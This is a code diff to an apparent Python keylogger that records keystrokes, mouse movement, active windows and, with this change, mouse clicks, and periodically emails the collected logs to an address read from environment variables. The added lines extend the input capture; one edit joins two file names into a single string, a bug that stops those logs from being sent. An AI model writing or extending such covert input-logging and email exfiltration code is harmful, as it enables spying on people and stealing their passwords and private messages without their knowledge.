@@ -12,7 +12,6 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-
 EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
 EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
 TO_EMAIL = os.getenv("TO_EMAIL")
@@ -30,6 +29,15 @@ try:
 except Exception as e:
     print(f"[!] Keyboard disabled: {e}")
     KEYBOARD_OK = False
+
+# mouse click setup
+try:
+    from pynput.mouse import Listener as MouseListener
+
+    MOUSE_CLICK_OK = True
+except Exception as e:
+    print(f"[!] Mouse click tracking disabled: {e}")
+    MOUSE_CLICK_OK = False
 
 # mouse setup
 try:
@@ -86,6 +94,20 @@ def start_keyboard():
         listener.join()
 
 
+# mouse click code
+def on_click(x, y, button, pressed):
+    if pressed:
+        with open("mouse_clicks.txt", "a", encoding="utf-8") as f:
+            f.write(f"{time.time():.2f},{button},{x},{y}\n")
+
+
+def start_mouse_clicks():
+    if not MOUSE_CLICK_OK:
+        return
+    with MouseListener(on_click=on_click) as listener:
+        listener.join()
+
+
 # mouse code
 def start_mouse():
     if not MOUSE_OK:
@@ -125,7 +147,11 @@ def send_logs():
 
     body = ""
 
-    for filename in ["key_logs.txt", "mouse_log.txt", "window_log.txt"]:
+    for filename in [
+        "key_logs.txt",
+        "mouse_log.txt",
+        "window_log.txt, mouse_clicks.txt",
+    ]:
         if os.path.exists(filename):
             with open(filename, "r", errors="ignore") as f:
                 content = f.read().strip()
@@ -166,6 +192,8 @@ if __name__ == "__main__":
         threads.append(threading.Thread(target=start_mouse, daemon=True))
     if WINDOW_OK:
         threads.append(threading.Thread(target=start_window, daemon=True))
+    if MOUSE_CLICK_OK:
+        threads.append(threading.Thread(target=start_mouse_clicks, daemon=True))
 
     threads.append(threading.Thread(target=email_loop, daemon=True))
 
